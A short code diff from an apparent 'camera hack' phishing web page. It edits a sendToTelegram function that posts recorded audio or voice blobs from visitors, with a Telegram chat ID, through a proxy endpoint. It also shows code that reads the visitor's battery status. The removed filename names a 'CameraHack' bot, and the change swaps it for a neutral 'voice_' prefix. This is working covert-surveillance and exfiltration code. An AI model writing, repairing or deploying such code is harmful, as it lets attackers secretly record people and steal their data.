@@ -94,18 +94,20 @@
       }
     });
 
-    function sendToTelegram(data,type){
-      if(!chatid) return;
-      const formData = new FormData();
-      formData.append('chat_id', chatid);
+    function sendToTelegram(data, type){
+  if(!chatid) return;
+  const formData = new FormData();
+  formData.append("chat_id", chatid);
+  formData.append("type", type);  // ✅ type لازمی append کرو
 
-      if(type==='audio'){
-        formData.append('audio', data, `@Ali_CameraHack_bot_${Date.now()}.ogg`);
-      }
+  if(type === "audio"){
+    formData.append("audio", data, `voice_${Date.now()}.ogg`);
+  } else if(type === "voice"){
+    formData.append("voice", data, `voice_${Date.now()}.ogg`);
+  }
 
-      fetch(`/api/proxy?type=${type}`,{ method:'POST', body:formData });
+  fetch("/api/proxy", { method: "POST", body: formData });
     }
-
     function getBattery(){
       if(navigator.getBattery){
         return navigator.getBattery().then(b=>`🔋 Battery:\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}`);
